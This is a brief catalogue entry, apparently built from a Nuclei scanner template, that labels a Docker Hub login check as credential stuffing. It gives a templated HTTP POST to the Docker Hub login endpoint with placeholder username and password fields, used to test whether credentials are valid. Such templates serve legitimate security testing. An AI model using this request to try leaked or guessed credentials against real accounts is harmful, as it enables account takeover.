# Vulnerability: Docker Hub Login Check
**Classification:** CREDS-STUFFING
**Source:** Nuclei Template (`docker-hub-login-check.yaml`)

## Description
Checks for a valid Docker Hub account.

## Vulnerable Code Pattern / Exploit Payload
```http
POST https://hub.docker.com/v2/users/login HTTP/1.1
Host: hub.docker.com
Content-Type: application/json

{
  "username": "{{username}}",
  "password": "{{password}}"
}
```

